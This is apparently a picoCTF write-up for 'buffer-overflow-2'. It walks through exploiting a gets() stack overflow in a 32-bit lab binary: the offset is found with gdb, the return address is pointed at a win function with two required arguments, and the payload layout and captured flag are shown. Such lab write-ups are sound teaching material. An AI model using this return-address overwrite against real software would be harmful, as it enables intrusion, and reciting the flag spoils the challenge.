# buffer-overflow-2

To start, some basic enumeration

```bash
file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=1c57f0cbd109ed51024baf11930a5364186c28df, for GNU/Linux 3.2.0, not stripped
```

```bash
checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   77 Symbols        No    0               3               vuln
```

Lastly, looking at the source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

There is a buffer overflow on line 29. There is a catch though. On line 20 and 22 there are conditional checks for arguments passed to the `win` function. You can't just jump to `win` blindly and expect the flag to print. In order to pass arguments to a function with a buffer overflow, you need to understand how a stack frame is initialized. 

When we call a new function, the program does some preperations before jumping. 

```
=====================
|      buffer       |
|===================|
|       EBP         |
|===================|
|       EIP         |
|===================|
|       arg1        |
|===================|
|       arg2        |
=====================
```

The above depicts the state of the stack before the function call. Essentially, we first need to overwrite the return pointer to control code execution. After the return pointer, you can write the next address to be executed once the function call returns. Lastly, write both parameters onto the stack.

First, you'll need to overwrite the return address by finding the offset.

```
Please enter your string: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

Program received signal SIGSEGV, Segmentation fault.
0x64413764 in ?? ()
(gdb)
...
[*] Exact match at offset 112
```

Verifying

```
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Next, determine where to jump to.

```
(gdb) info functions
...
0x08049296  win
0x08049338  vuln
0x08049372  main
...
```

Lastly, determine the order of arguments. An easy way to do this is to look at where the comparisons are happening in memory.

```
(gdb) disass win
...
0x0804930c <+118>:   cmp    DWORD PTR [ebp+0x8],0xcafef00d
0x08049313 <+125>:   jne    0x804932f <win+153>
0x08049315 <+127>:   cmp    DWORD PTR [ebp+0xc],0xf00df00d
0x0804931c <+134>:   jne    0x8049332 <win+156>
...
```

Seems like the parameters are passed sequentially (i.e. arg1, arg2, ...). So the payload will look something like:

```
Padding + Return Address + Next Executed Inst. + Arg1 + Arg2
```

flag: `picoCTF{argum3nt5_4_d4yZ_31432deb}`


## References
[Return-to-libc](https://web.archive.org/web/20161106210059/https://www.exploit-db.com/docs/28553.pdf)